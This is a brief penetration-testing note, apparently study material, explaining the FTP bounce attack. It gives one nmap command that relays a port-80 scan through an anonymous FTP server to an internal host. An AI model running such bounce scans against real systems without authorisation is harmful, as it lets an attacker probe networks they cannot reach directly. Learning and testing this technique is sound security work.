### Bounce Back Attack

This type of attack uses the FTP server to deliver outbound traffic to another device. 

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

